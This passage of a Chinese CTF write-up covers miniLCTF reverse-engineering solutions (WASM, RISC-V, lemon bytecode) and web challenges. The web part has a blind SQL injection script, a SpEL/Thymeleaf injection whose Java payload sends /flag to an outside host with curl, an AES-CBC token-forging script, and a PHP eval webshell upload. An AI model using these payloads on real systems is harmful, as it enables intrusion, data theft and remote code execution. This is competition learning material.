      v11 = i32_load(&memory, (unsigned int)v55 + 20LL) + 8;// i+=8
      i32_store(&memory, (unsigned int)v55 + 20LL, v11);
    }
    v15 = i32_load(&memory, (unsigned int)v55 + 60LL);
    w2c_dlfree(v15);                            // free 空间
    v12 = i32_load(&memory, (unsigned int)v55 + 24LL);// flag
    i32_store(&memory, (unsigned int)v55 + 108LL, v12);// result = flag
  }
  else
  {
    i32_store(&memory, (unsigned int)v55 + 108LL, -1);// result = -1
  }
  result = i32_load(&memory, (unsigned int)v55 + 108LL);
  stack_ptr = v55 + 112;
  --wasm_rt_call_stack_depth;
  return result;
}
```

## qua_rou 函数:

```c
int __cdecl w2c_qua_rou(int addr, int a2, int a3, int a4, int a5)
{
  char v6; // [esp+30h] [ebp-2A8h]
  int v7; // [esp+34h] [ebp-2A4h]
  int v8; // [esp+3Ch] [ebp-29Ch]
  int v9; // [esp+40h] [ebp-298h]
  int v10; // [esp+64h] [ebp-274h]
  int v11; // [esp+6Ch] [ebp-26Ch]
  char v12; // [esp+70h] [ebp-268h]
  int v13; // [esp+7Ch] [ebp-25Ch]
  int v14; // [esp+84h] [ebp-254h]
  char v15; // [esp+A4h] [ebp-234h]
  int v16; // [esp+A8h] [ebp-230h]
  int v17; // [esp+B0h] [ebp-228h]
  char v18; // [esp+B4h] [ebp-224h]
  int v19; // [esp+C0h] [ebp-218h]
  int v20; // [esp+C8h] [ebp-210h]
  char v21; // [esp+D8h] [ebp-200h]
  int v22; // [esp+DCh] [ebp-1FCh]
  int v23; // [esp+E4h] [ebp-1F4h]
  int v24; // [esp+E8h] [ebp-1F0h]
  int v25; // [esp+10Ch] [ebp-1CCh]
  int v26; // [esp+114h] [ebp-1C4h]
  char v27; // [esp+118h] [ebp-1C0h]
  int v28; // [esp+124h] [ebp-1B4h]
  int v29; // [esp+12Ch] [ebp-1ACh]
  char v30; // [esp+14Ch] [ebp-18Ch]
  int v31; // [esp+150h] [ebp-188h]
  int v32; // [esp+158h] [ebp-180h]
  char v33; // [esp+15Ch] [ebp-17Ch]
  int v34; // [esp+168h] [ebp-170h]
  int v35; // [esp+170h] [ebp-168h]
  char v36; // [esp+180h] [ebp-158h]
  int v37; // [esp+184h] [ebp-154h]
  int v38; // [esp+18Ch] [ebp-14Ch]
  int v39; // [esp+190h] [ebp-148h]
  int v40; // [esp+1B4h] [ebp-124h]
  int v41; // [esp+1BCh] [ebp-11Ch]
  char v42; // [esp+1C0h] [ebp-118h]
  int v43; // [esp+1CCh] [ebp-10Ch]
  int v44; // [esp+1D4h] [ebp-104h]
  char v45; // [esp+1F4h] [ebp-E4h]
  int v46; // [esp+1F8h] [ebp-E0h]
  int v47; // [esp+200h] [ebp-D8h]
  char v48; // [esp+204h] [ebp-D4h]
  int v49; // [esp+210h] [ebp-C8h]
  int v50; // [esp+218h] [ebp-C0h]
  char v51; // [esp+228h] [ebp-B0h]
  int v52; // [esp+22Ch] [ebp-ACh]
  int v53; // [esp+234h] [ebp-A4h]
  int v54; // [esp+238h] [ebp-A0h]
  int v55; // [esp+25Ch] [ebp-7Ch]
  int v56; // [esp+264h] [ebp-74h]
  char v57; // [esp+268h] [ebp-70h]
  int v58; // [esp+274h] [ebp-64h]
  int v59; // [esp+27Ch] [ebp-5Ch]
  char v60; // [esp+29Ch] [ebp-3Ch]
  int v61; // [esp+2A0h] [ebp-38h]
  int v62; // [esp+2A8h] [ebp-30h]
  char v63; // [esp+2ACh] [ebp-2Ch]
  int v64; // [esp+2B8h] [ebp-20h]
  int v65; // [esp+2C0h] [ebp-18h]
  int v66; // [esp+2C4h] [ebp-14h]

  if ( ++wasm_rt_call_stack_depth > 0x1F4u )
    wasm_rt_trap(7);
  v66 = stack_ptr - 32;                         // 开空间
  i32_store(&memory, (unsigned int)(stack_ptr - 32) + 28LL, addr);// 存参数
  i32_store(&memory, (unsigned int)v66 + 24LL, a2);
  i32_store(&memory, (unsigned int)v66 + 20LL, a3);
  i32_store(&memory, (unsigned int)v66 + 16LL, a4);
  i32_store(&memory, (unsigned int)v66 + 12LL, a5);
  v65 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v64 = i32_load(&memory, (unsigned int)v66 + 24LL) + v65;
  v63 = i32_load8_u(&memory, v64, 0);           // addr+a2
  v62 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v61 = i32_load(&memory, (unsigned int)v66 + 12LL) + v62;
  v60 = i32_load8_u(&memory, v61, 0);           // addr +a5
  v59 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v58 = i32_load(&memory, (unsigned int)v66 + 24LL) + v59;
  v57 = i32_load8_u(&memory, v58, 0);           // addr+a2
  v56 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v55 = i32_load(&memory, (unsigned int)v66 + 12LL) + v56;// addr+a5
  v54 = ((int)(unsigned __int8)(i32_load8_u(&memory, v55, 0) + v57) >> 4) | (16 * (unsigned __int8)(v60 + v63));// (a[a5]+a[a2])>>4 | (a[a5]+a[a2])<<4
  v53 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v52 = i32_load(&memory, (unsigned int)v66 + 20LL) + v53;
  v51 = i32_load8_u(&memory, v52, 0);           // addr+a3
  i32_store8(&memory, (unsigned int)v52, v54 ^ v51);// a[a3] ^= xxx 
  v50 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v49 = i32_load(&memory, (unsigned int)v66 + 16LL) + v50;
  v48 = i32_load8_u(&memory, v49, 0);           // addr+a4
  v47 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v46 = i32_load(&memory, (unsigned int)v66 + 20LL) + v47;
  v45 = i32_load8_u(&memory, v46, 0);           // addr+a3
  v44 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v43 = i32_load(&memory, (unsigned int)v66 + 16LL) + v44;
  v42 = i32_load8_u(&memory, v43, 0);           // addr+a4
  v41 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v40 = i32_load(&memory, (unsigned int)v66 + 20LL) + v41;
  v39 = ((int)(unsigned __int8)(i32_load8_u(&memory, v40, 0) + v42) >> 6) | (4 * (unsigned __int8)(v45 + v48));// (a[a3]+a[a4])>>6 | (a[a3]+a[a4])<<2
  v38 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v37 = i32_load(&memory, (unsigned int)v66 + 12LL) + v38;
  v36 = i32_load8_u(&memory, v37, 0);           // a[a5]^=xxxx
  i32_store8(&memory, (unsigned int)v37, v39 ^ v36);
  v35 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v34 = i32_load(&memory, (unsigned int)v66 + 20LL) + v35;// a3
  v33 = i32_load8_u(&memory, v34, 0);
  v32 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v31 = i32_load(&memory, (unsigned int)v66 + 24LL) + v32;// a2
  v30 = i32_load8_u(&memory, v31, 0);
  v29 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v28 = i32_load(&memory, (unsigned int)v66 + 20LL) + v29;// a3
  v27 = i32_load8_u(&memory, v28, 0);
  v26 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v25 = i32_load(&memory, (unsigned int)v66 + 24LL) + v26;
  v24 = ((int)(unsigned __int8)(i32_load8_u(&memory, v25, 0) + v27) >> 5) | (8 * (unsigned __int8)(v30 + v33));// (a[a3]+a[a2])>>5 | (a[a3]+a[a2])<<3
  v23 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v22 = i32_load(&memory, (unsigned int)v66 + 16LL) + v23;
  v21 = i32_load8_u(&memory, v22, 0);
  i32_store8(&memory, (unsigned int)v22, v24 ^ v21);// a4^=
  v20 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v19 = i32_load(&memory, (unsigned int)v66 + 12LL) + v20;// a5
  v18 = i32_load8_u(&memory, v19, 0);
  v17 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v16 = i32_load(&memory, (unsigned int)v66 + 16LL) + v17;// a4
  v15 = i32_load8_u(&memory, v16, 0);
  v14 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v13 = i32_load(&memory, (unsigned int)v66 + 12LL) + v14;
  v12 = i32_load8_u(&memory, v13, 0);
  v11 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v10 = i32_load(&memory, (unsigned int)v66 + 16LL) + v11;
  v9 = ((int)(unsigned __int8)(i32_load8_u(&memory, v10, 0) + v12) >> 7) | (2 * (unsigned __int8)(v15 + v18));// (a[a5]+a[a4])>>7 | (a[a5]+a[a4])<<1
  v8 = i32_load(&memory, (unsigned int)v66 + 28LL);
  v7 = i32_load(&memory, (unsigned int)v66 + 24LL) + v8;// a2^=
  v6 = i32_load8_u(&memory, v7, 0);
  i32_store8(&memory, (unsigned int)v7, v9 ^ v6);
  return --wasm_rt_call_stack_depth;
}
```

## 脚本

```python
enc = "05779c24d9249e693fa7ac4a10c68dfbd3520083b33f56e90fd84978b6a15c970b976779a8fefe91fb87d2221c9a1f87ed7eaddb8ae6370f9de69e3a7a5c5c488cde79756b0b9f1713e749edd41cff04"
key = 'D33.B4T0'
data = '0123456789abcdef'


enc1 = [[], [], [], [], []]  # 5 组 32 字节数据
for i in range(5):
    for j in range(32):
        enc1[i].append(int(enc[32*i+j], 16))

table = []  # 索引表
for i in range(16):
    table.append(int(data[i], 16))

key_flag = [[], [], [], [], []]  # 5 组 16 字节数据 key+flag
for i in range(5):
    for j in range(16):
        key_flag[i].append(16*table.index(enc1[i][2*j]) +  # 奇数字节在 table 中的位置乘 16 + 偶数字节在 table 中的位置
                           table.index(enc1[i][2*j+1]))


def decode(a, a2, a3, a4, a5):
    a[a2] ^= (((a[a5]+a[a4] & 0xFF) >> 7) | ((a[a5]+a[a4]) << 1)) & 0xFF
    a[a4] ^= (((a[a3]+a[a2] & 0xFF) >> 5) | ((a[a3]+a[a2]) << 3)) & 0xFF
    a[a5] ^= (((a[a3]+a[a4] & 0xFF) >> 6) | ((a[a3]+a[a4]) << 2)) & 0xFF
    a[a3] ^= (((a[a5]+a[a2] & 0xFF) >> 4) | ((a[a5]+a[a2]) << 4)) & 0xFF


for i in range(5):
    for j in range(42):
        decode(key_flag[i], 14, 9, 4, 3)
        decode(key_flag[i], 13, 8, 7, 2)
        decode(key_flag[i], 12, 11, 6, 1)
        decode(key_flag[i], 15, 10, 5, 0)
        decode(key_flag[i], 15, 11, 7, 3)
        decode(key_flag[i], 14, 10, 6, 2)
        decode(key_flag[i], 13, 9, 5, 1)
        decode(key_flag[i], 12, 8, 4, 0)
    str = ""
    for ch in key_flag[i]:
        str += chr(ch)
    print(str[8:], end="")
```

```
miniLctf{0ooo00oh!h3ll0_WASM_h4ck3r!}
```



# NotRC4 | hzlg | done

ida 不能打开,报错`Undefined or unknown machine type 243`

查了一下报错,发现是 risc-v 指令集

readelf -h 看一下, 果然是

查到的文章中用 docker 能执行,我试了下,但是又报错`GLIBC_2.34 not found`,升级了一会没升成

队友锐评: "新人常犯的错误:升级 glibc "   ~~好骂~~



继续搜索,发现 risc-v 用 Ghidra 可以反编译

> [HarmonyOS 和 HMS 专场 CTF Risc-V Pwn 题解 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8977)
>
> Risc-V 静态和动态分析:
>
> 计算机指令集可以分为两种：复杂指令集和精简指令集。
> 复杂指令集以 x86 指令集最为常见，多用于传统桌面软件，善于处理复杂的计算逻辑。精简指令集有 ARM、MIPS 和 Risc-V 等。ARM 广泛应用于移动手持终端以及 IoT 设备，但是 ARM 指令集虽然开放但是授权架价格太高，而 Risc-V 是一套开源的精简指令集架构，企业可以完全免费的使用。
> 目前来讲，现有的工具链已经足以支持 Risc-V 的逆向分析。
> 在静态分析层面，Ghidra 9.2 对于 Risc-V 的反编译效果不错（IDA 7.5 尚不支持 Risc-V），所以**静态分析 Risc-V 用 ghidra 已经足够**。
>
> 在动态调试层面，qemu 已经集成了 risc-v 架构，可以支持该架构的模拟运行。在有 lib 的情况下，通过 QEMU 用户模式，添加`-L`参数选择 lib 路径，通过`-g`指定调试端口。在 gdb 高版本中，已经可以支持 risv 架构，同时配合 gef 插件，设置 target remote 连接 QEMU 的调试端口：

官网有初步的视频教程↓

[Ghidra (ghidra-sre.org)](https://ghidra-sre.org/)

## main 函数

输入 16 字节 flag 存到 d_20e8

调用 f_828 在 local_80处 创建函数表

调用 f_934 遍历 d_2018(opcode),执行函数

```c
undefined8 main(void)

{
  undefined8 uVar1;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  longlong local_18;
  
  local_18 = __stack_chk_guard;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  FUN_00100740_puts("Input your flag",0);
  FUN_00100720_scanf(&DAT_00100d78,&DAT_001020e8);
  FUN_00100828(&local_80);
  FUN_00100934(&local_80);
  FUN_00100760("Right!");
  uVar1 = 0;
  if (__stack_chk_guard != local_18) {
    FUN_00100730(0);
  }
  return uVar1;
}
```

### FUN_00100828_set_ftable_at_local80

在 local_80 地址处开始存函数

```c
void FUN_00100828(undefined4 *param_1)

{
  *param_1 = 0;
  *(undefined *)(param_1 + 6) = 0xf1;
  *(undefined **)(param_1 + 8) = &LAB_00100b7e_check_c8_and_30;
  *(undefined *)(param_1 + 10) = 0xf2;
  *(undefined **)(param_1 + 0xc) = &LAB_00100bfe;
  *(undefined *)(param_1 + 0xe) = 0xf3;
  *(undefined **)(param_1 + 0x10) = &LAB_00100974;
  *(undefined *)(param_1 + 0x12) = 0xf4;
  *(undefined **)(param_1 + 0x14) = &LAB_00100a10;
  *(undefined *)(param_1 + 0x16) = 0xf5;
  *(undefined **)(param_1 + 0x18) = &LAB_00100af0;
  return;
}
```

### FUN_00100934_ex_func_under_opcode

根据 opcode 执行在 local_80 中的函数

```
DAT_00102018                                    
        00102018 f3              ??         F3h
        00102019 00              ??         00h
        0010201a f4              ??         F4h
        0010201b e1              ??         E1h
        0010201c f4              ??         F4h
        0010201d e2              ??         E2h
        0010201e f2              ??         F2h
        0010201f 04              ??         04h
        00102020 0b              ??         0Bh
        00102021 f5              ??         F5h
        00102022 f3              ??         F3h
        00102023 02              ??         02h
        00102024 f4              ??         F4h
        00102025 e1              ??         E1h
        00102026 f4              ??         F4h
        00102027 e2              ??         E2h
        00102028 f2              ??         F2h
        00102029 04              ??         04h
        0010202a 0b              ??         0Bh
        0010202b f5              ??         F5h
        0010202c f1              ??         F1h
        0010202d ff              ??         FFh
        0010202e 00              ??         00h
        0010202f 00              ??         00h
```

`opcode = [0xf3, 0x00, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf3,
          0x02, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf1, 0xff, 0x00, 0x00]`

```c
void FUN_00100934(int *param_1)

{
  while ((&DAT_00102018)[*param_1] != -1) {
    FUN_001008ba(param_1);
  }
  return;
} 
```

```c
void FUN_001008ba(int *param_1)

{
  int local_14;
  
  local_14 = 0;
  while( true ) {
    if (4 < local_14) {
      return;
    }
    if ((&DAT_00102018)[*param_1] == *(char *)(param_1 + ((longlong)local_14 + 1) * 4 + 2)) break;
    local_14 = local_14 + 1;
  }
  (**(code **)(param_1 + ((longlong)local_14 + 1) * 4 + 4))
            (param_1,*(code **)(param_1 + ((longlong)local_14 + 1) * 4 + 4));
  return;
}
```

## f1_b7e_check_c8_and_30

d_20c8 和 d_2030 比较

```
        DAT_00102030                                    XREF[2]:     00100ba6(*), 00100bb2(R)  
        00102030 ca              ??         CAh
        00102031 82              ??         82h
        00102032 ef              ??         EFh
        00102033 95              ??         95h
        00102034 bb              ??         BBh
        00102035 1d              ??         1Dh
        00102036 c2              ??         C2h
        00102037 4b              ??         4Bh    K
        00102038 be              ??         BEh
        00102039 47              ??         47h    G
        0010203a b5              ??         B5h
        0010203b 71              ??         71h    q
        0010203c ae              ??         AEh
        0010203d ec              ??         ECh
        0010203e 7b              ??         7Bh    {
        0010203f f5              ??         F5h
        00102040 cd              ??         CDh
        00102041 f6              ??         F6h
        00102042 e7              ??         E7h
        00102043 15              ??         15h
        00102044 ab              ??         ABh
        00102045 bd              ??         BDh
        00102046 a1              ??         A1h
        00102047 80              ??         80h
        00102048 85              ??         85h
        00102049 63              ??         63h    c
        0010204a 77              ??         77h    w
        0010204b e1              ??         E1h
        0010204c d7              ??         D7h
        0010204d 93              ??         93h
        0010204e c7              ??         C7h
        0010204f a3              ??         A3h

```



```c
void UndefinedFunction_00100b7e(int *param_1)
{
  int iStack20;
  
  for (iStack20 = 0; iStack20 < 4; iStack20 = iStack20 + 1) {
    if (*(longlong *)(&DAT_001020c8 + (longlong)iStack20 * 8) !=
        *(longlong *)(&DAT_00102030 + (longlong)iStack20 * 8)) {
      FUN_00100760_print_gp_main_scanf("Wrong!");
      FUN_00100750_exit_param(0);
    }
  }
  *param_1 = *param_1 + 1;
  return;
}
```

## f2_bfe_loop_12

```c
void UndefinedFunction_00100bfe(int *param_1)

{
  if (DAT_00102108 < (int)(uint)(byte)(&DAT_00102018)[*param_1 + 2]) {
    *param_1 = *param_1 - (uint)(byte)(&DAT_00102018)[*param_1 + 1];
    DAT_00102108 = DAT_00102108 + 1;
  }
  else {
    DAT_00102108 = 0;
    *param_1 = *param_1 + 3;
  }
  return;
}
```

## f3_974_get_input_with_key

```
        DAT_00102008                                    XREF[2]:     001009ae(R), 00100a6e(R)  
        00102008 21 74 62        undefined8 0000000064627421h
                 64 00 00 
                 00 00
                 
        DAT_00102010                                    XREF[2]:     001009ec(R), 00100acc(R)  
        00102010 73 64 79        undefined8 0000000079796473h
                 79 00 00 
                 00 00
```

> d_2008 是 dbt!
>
> d_2010 是 yyds

```c
void UndefinedFunction_00100974(int *param_1)
{
  *(longlong *)(param_1 + 2) =
       *(longlong *)
        (&DAT_001020e8_input + (longlong)(int)(uint)(byte)(&DAT_00102018)[*param_1 + 1] * 8) +
       DAT_00102008;
  *(longlong *)(param_1 + 4) =
       *(longlong *)
        (&DAT_001020e8_input + (longlong)(int)((byte)(&DAT_00102018)[*param_1 + 1] + 1) * 8) +
       DAT_00102010;
  *param_1 = *param_1 + 2;
  return;
}
```



## f4_a10_encrypt_input_with_key

```c
void UndefinedFunction_00100a10(int *param_1)

{
  if ((&DAT_00102018)[*param_1 + 1] == -0x1f) {
    *(ulonglong *)(param_1 + 2) =
         DAT_00102008 +
         ((*(ulonglong *)(param_1 + 4) ^ *(ulonglong *)(param_1 + 2)) >>
          ((longlong)-(int)*(undefined8 *)(param_1 + 4) & 0x3fU) |
         (*(ulonglong *)(param_1 + 4) ^ *(ulonglong *)(param_1 + 2)) <<
         ((longlong)(int)*(undefined8 *)(param_1 + 4) & 0x3fU));
  }
  if ((&DAT_00102018)[*param_1 + 1] == -0x1e) {
    *(ulonglong *)(param_1 + 4) =
         DAT_00102010 +
         ((*(ulonglong *)(param_1 + 4) ^ *(ulonglong *)(param_1 + 2)) >>
          ((longlong)-(int)*(undefined8 *)(param_1 + 2) & 0x3fU) |
         (*(ulonglong *)(param_1 + 4) ^ *(ulonglong *)(param_1 + 2)) <<
         ((longlong)(int)*(undefined8 *)(param_1 + 2) & 0x3fU));
  }
  *param_1 = *param_1 + 2;
  return;
}
```

## f5_af0_safe_to_d_20c8

```c
void UndefinedFunction_00100af0(int *param_1)

{
  *(undefined8 *)(&DAT_001020c8 + (longlong)DAT_0010210c * 8) = *(undefined8 *)(param_1 + 2);
  *(undefined8 *)(&DAT_001020c8 + (longlong)(DAT_0010210c + 1) * 8) = *(undefined8 *)(param_1 + 4);
  *(undefined8 *)(param_1 + 2) = 0;
  *(undefined8 *)(param_1 + 4) = 0;
  DAT_0010210c = DAT_0010210c + 2;
  *param_1 = *param_1 + 1;
  return;
}
```

## 脚本

`opcode = [0xf3, 0x00, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf3,
          0x02, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf1, 0xff, 0x00, 0x00]`

f3 取两个 64 位输入,分别加上 key,f4 迭代 12 次(每次加密两轮),f5 保存,重复一遍前面的操作,最后 f1 拿保存了的值与 d_2030 中的值对比

逆回去的话:拿 d_2030 中的值解密 12 轮,减去 key 即可

```python
from Crypto.Util.number import *


def f4(v1, v2):
    v = v1 ^ v2
    a = (v >> (-v2 & 0x3f)) | (v << (v2 & 0x3f) & 0xffffffffffffffff)
    v1 = a+0x64627421

    v = v1 ^ v2
    b = ((v >> (-v1 & 0x3f)) | (v << (v1 & 0x3f)) & 0xffffffffffffffff)
    v2 = b+0x79796473
    return v1, v2


def decrypt(v1, v2):
    b = v2-0x79796473
    v = ((b << (-v1 & 0x3f)) | (b >> (v1 & 0x3f))) & 0xffffffffffffffff
    v2 = v ^ v1

    a = v1-0x64627421
    v = ((a << (-v2 & 0x3f)) | (a >> (v2 & 0x3f))) & 0xffffffffffffffff
    v1 = v ^ v2
    return v1, v2


input = [
    0x4BC21DBB95EF82CA,
    0xF57BECAE71B547BE,
    0x80A1BDAB15E7F6CD,
    0xA3C793D7E1776385
]


for i in range(2):
    v1 = input[2*i]
    v2 = input[2*i+1]
    for j in range(12):
        v1, v2 = decrypt(v1, v2)
    a = v1-0x64627421
    b = v2-0x79796473
    print(long_to_bytes(a)[::-1]+long_to_bytes(b)[::-1])
```

```
miniLCTF{I_hate_U_r1sc-V!}
```

# lemon | hzlg | done

reference :

> 字节码嗯逆(无函数和类)可以看 : [长安“战疫”逆向WP - EPs1l0h - 博客园 (cnblogs.com)](https://www.cnblogs.com/THRANDUil/p/15805724.html#40---lemon)
>
> 官方文档[Documentation (lemon-lang.org)](http://www.lemon-lang.org/documentation)

> 拿 python 逆完了字节码,执行却出错
>
> 看了 hint 决定编译出 lemon 字节码看看,用 lemon 解释器执行就对了
>
> 写wp的时候测试发现 : lemon 和 py 的`%运算 `不一样!!! 
>
> 原因**可能**是 : [C 和 Python 中取模运算 _ QJings 的博客 - CSDN 博客 _ python 的取模运算](https://blog.csdn.net/QJing_shijia/article/details/113566668)
>
> 但是把 python % 操作符重载成向上,向下,向 0 取整 或者 四舍五入,都跑不出,写的血压高了,遂放弃写 py 脚本

复原完的 lemon:

```
var v0 = 0xd33b470;

def next()
{
    v0 = (v0 * 0xdeadbeef + 0xb14cb12d) % 0xffffffff;
    return v0;
}
class RunMe()
{

    def __init__(var n)
    {
        self.enc = [];
        self.flag = [];
        self.res = [ 2141786733, 76267819, 37219027, 219942343, 755999918, 701306806, 532732060, 334234642, 524809386, 333469062, 160092960, 126810196, 238089888, 301365991, 258515107, 424705310, 1041878913, 618187854, 4680810, 827308967, 66957703, 924471115, 735310319, 541128627, 47689903, 459905620, 495518230, 167708778, 586337393, 521761774, 861166604,
                     626644061, 1030425184, 665229750, 330150  ];
        var i = 0;
        while (i < n)
        {
            self.enc.append(next());
            i += 1;
        }
    }
    def sign(var x, var y)
    {
        var i = 0;
        while (i < 35)
        {
            self.flag.append(x[i] ^ y[i]);
            i += 1;
        }
        return nil;
    }
}
var var05 = RunMe(35);
var05.sign(var05.enc, var05.res);
print(var05.flag);
```

```
miniLctf{l3m0n_1s_s0_s0urrR77RrrR7}
```




---

# mini_sql | hahaha | done

网页源代码给出了 SQL 执行语句`select * from users where username='$username' and password='$password';`

首先 fuzz 一下，

![image-20220508154601107](C:\Users\hhh\AppData\Roaming\Typora\typora-user-images\image-20220508154601107.png)

union,select 均被过滤，双写，大小写，试了很多绕过均没用，但转移符`\`和`||`还在,得到

`username=admin\&password=||2>1;%00`，回显 success!，注入成功。由此推断使用布尔盲注，常用函数中还剩下`mid()`和`length()`

由此得到`username=admin\&password=||length(username)>10;%00` ,注出 username 长度为19。

`username=admin\&password=||mid(username1,1)>0x??;%00`注出 username =`w3lc0me_t0_m1n1lct5`

但是 password 因为 or 被过滤了导致不能查询这个字段名，试了很多方法构造不出来，放弃这个方法，在搜索引擎里寻宝。

在一篇文章看到 selet 被过滤的情况下，如果 mysql 版本高于 8.0.19 ,可以使用 table 语句注入，据此写出脚本，~~当时没有收藏，清缓存时不小心把浏览记录删了，找不到原文章了~~

```python
import requests
import sys
from urllib.parse import unquote

url="http://47.93.215.154:10000/login.php"
ascii="/0123456789:;ABCDEFGHIJKLMNOPQRSTUVWXYZ_`abcdefghijklmnopqrstuvwxyz.{|}~"
flag=""


for i in range(100):

    for j in ascii:


     #payload='||(("ctf","users",binary"{}","",1,1)<= (table mysql.innodb_table_stats limit 0,1));%00'.format(flag+j)
     payload='||((1,"w3lc0me_t0_m1n1lct5",binary"{}")<= (table users limit 0,1));%00'.format(flag+j)
     data={
        "username":"admin\\",
       "password":unquote(payload)

       }
     r=requests.post(url,data=data)

     print(r.text)

     if "success!" not in r.text:
       flag+=chr(ord(j)-1)
       print(flag)
       break


     if j=='~':
       flag=flag[:-1]+chr(ord(flag[-1])+1)
       print(flag)
       sys.exit(0)
```

跑出密码`cd51c1005cab68be2f7e6112a4de3e89`后登录得到 flag

# mini_springboot | hahaha | done

提示 springboot +模板注入

猜测使用的 Thymeleaf,测试后发现在路径中存在注入,但是有 waf,过滤了 Runtime,还有 new 

最开始想的用反射绕

```
http://49.235.72.127:8080/__${T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String)).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),"curl q9vl5b.dnslog.cn")}__::assadasd.asdas
```

命令执行成功了但是没有利用成功,测了下因为存在`,`或`{`会报错

换种思路:利用 spel 注入内存马

demo.java

```java
import java.io.IOException;
public class demo {
static{
        try {
                Runtime.getRuntime().exec("curl ip:2333 -d @/flag");
        } catch (IOException e) {
                e.printStackTrace();
        }
}
}
```

```java
public static void main(String[] args) throws IOException {
    byte[] bytes = Files.readAllBytes(Paths.get("target\\classes\\demo.class"));
    String encode = com.sun.org.apache.xerces.internal.impl.dv.util.HexBin.encode(bytes);
    System.out.println(encode);
}
```

```
T(org.springframework.cglib.core.ReflectUtils).defineClass("demo",T(com.sun.org.apache.xerces.internal.impl.dv.util.HexBin).decode("十六进制编码"),T(org.springframework.util.ClassUtils).getDefaultClassLoader())
```

![image-20220505020711773](D:\Program Files\Typora\img\image-20220505020711773.png)

参考文章：https://forum.butian.net/share/1385

# checkin | hahaha | done

放出源码后一开始没看明白，但 token 值肯定是最重要的，去搜索 go 加密，感觉 CBC，AES和源文件很像，仔细了解真的是，由此写出 exp：

```python
# -*- coding: UTF-8 -*-
import base64
import urllib
iv_raw='0001145141919810'  #这里填写第一次返回的 iv 值
cipher_raw='MDAwMTE0NTE0MTkxOTgxMOSJAwAU25w%2BxwD1vPGvUJHg5CSOXQDhJ9gGync9G1%2FlaZWL0Z23%2Bkobjs5fT0831YTRw%2F81njx33kyfCbS9Bvk%3D'  #这里填写第一次返回的cipher值
print ("[*]原始 iv 和 cipher")
print ("cipher_raw:  " + cipher_raw)
print ("[*]对 cipher 解码，进行反转")
cipher = base64.b64decode(urllib.unquote(cipher_raw[:]))
#print(cipher[:])
iv_raw=cipher[:16]
print ("iv_raw:  " + iv_raw)
cipher=cipher[16:]
#print(cipher[:])
oldstr='{"Name":"guest",'
wantstr='{"Name":"admin",'
newIv=""
#{"Name":"guest",
#"CreateAt":16513
#88145,"IP":"127.
#0.0.1"}
#第二组秘文与第一组的明文异或得到了第二组经过解密的秘文，此时与我们想要得到的明文进行异或得到了我们第一组应该填写的秘文
for i in range(16):
    newIv += chr(ord(iv_raw[i])^ord(oldstr[i])^ord(wantstr[i]))
print("new iv: "+newIv)
xor_cipher = cipher #请根据你的输入自行更改，原理看上面的介绍
#xor_cipher2=cipher[0:25]+ chr(ord(cipher[25]) ^ ord('z') ^ ord('a')) + cipher[25:] #如果修改的是第三密文组，要对前一个密文修改
#print(xor_cipher)
xor_cipher=urllib.quote(base64.b64encode(newIv+xor_cipher))
print ("反转后的 cipher：" + xor_cipher)

```

修改 token 值得到 flag，所以这是密码题还是 Web 题。。。

参考文章；https://www.jianshu.com/p/26e42c841de6    https://learnku.com/articles/63967

# include | hahaha | done

拿到题首先上传一个图片马`<?php @eval($_POST['shell']); echo"luck"; ?>`，然后抓包。

![image-20220508001057471](C:\Users\hhh\AppData\Roaming\Typora\typora-user-images\image-20220508001057471.png)

发现有一个 Cookie 值,试着 base64 解密得到`O:4:"user":1:{s:9:"usergroup";s:7:"Tourist";}`,根据页面回显将 user 值改为加密过的`O:4:"user":1:{s:9:"usergroup";s:5:"Lteam";}`,并把.jpg 改为.php.

上传成功，得到路径。访问并且页面返回了 luck，再用蚁剑连接得到 flag。

![image-20220508002728324](C:\Users\hhh\AppData\Roaming\Typora\typora-user-images\image-20220508002728324.png)

---

# 彩蛋题 | Hana | done

https://xdsec.org/flag.html 即

`LCTF{h4ck3d_by_shal10w}`

# Paralympics | Hana | done

用 ue viewer 看 pak 文件

/Game/Meshes/StaticMesh.uasset 是半个flag `-9th-4R7-`

然后就拿到了半个flag

>用 CE 乱改 value 的时候导致了部分模型在特定视角下消失，于是看到了 flag 

实际上是用 CE 扫出来决定位置的 value ，然后改到奖杯那里，然后可以看到 flag

`miniLCTF{Ch4m-9th-4R7-p01N}`

